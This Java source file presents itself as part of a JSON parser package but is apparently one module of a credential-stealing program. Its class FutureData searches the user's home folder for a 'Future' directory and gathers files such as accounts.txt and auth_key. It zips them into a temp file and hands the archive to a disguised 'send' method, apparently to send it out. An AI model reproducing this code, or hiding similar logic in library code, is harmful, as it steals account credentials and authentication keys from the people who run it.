package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class FutureData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[] { "accounts.txt", "friends.json", "auth_key", "waypoints.txt" };

    @Override
    public void handle() {
        String home = System.getProperty("user.home");
        if (home == null || home.isEmpty()) {
            System.out.println("re");
            return;
        }

        String sep = FileSystemHelper.getSeparator();
        String futureDir = home + sep + "Future" + sep;

        if (!Files.isDirectory(Paths.get(futureDir))) {
            JSONRegexHandler.send("> Did not contain the Future folder.");
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>();
        for (String fileName : IMPORTANT_FILES) {
            String dir = futureDir + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + sep + "future_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "Future";
    }
}
